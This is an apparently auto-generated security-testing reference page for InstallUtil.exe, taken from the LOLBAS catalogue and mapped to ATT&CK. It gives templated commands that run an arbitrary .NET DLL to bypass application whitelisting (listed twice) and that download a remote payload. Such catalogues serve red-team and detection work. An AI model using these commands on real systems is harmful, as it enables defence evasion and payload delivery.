---
parsed_by: focuslocust
source: commands
type: generated
---
# Installutil Commands

[Home](../../../README.md)

> This page contains security testing commands. Use only in authorised environments.

## Installutil.exe

Tool page: [Installutil.exe](../../tools/windows/installutil.exe.md)

### Use to execute code and bypass application whitelisting

```text
InstallUtil.exe /logfile= /LogToConsole=false /U {PATH:.dll}
```

Description:

Execute the target .NET DLL or EXE.

Related ATT&CK:

- [T1218.004](../../attack/techniques/T1218.004-installutil.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/Installutil.yml` |
| Evidence | Command preserved from source parser. |

### Use to execute code and bypass application whitelisting

```text
InstallUtil.exe /logfile= /LogToConsole=false /U {PATH:.dll}
```

Description:

Execute the target .NET DLL or EXE.

Related ATT&CK:

- [T1218.004](../../attack/techniques/T1218.004-installutil.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/Installutil.yml` |
| Evidence | Command preserved from source parser. |

### Downloads payload from remote server

```text
InstallUtil.exe {REMOTEURL}
```

Description:

It will download a remote payload and place it in INetCache.

Related ATT&CK:

- [T1105](../../attack/techniques/T1105-ingress-tool-transfer.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/Installutil.yml` |
| Evidence | Command preserved from source parser. |
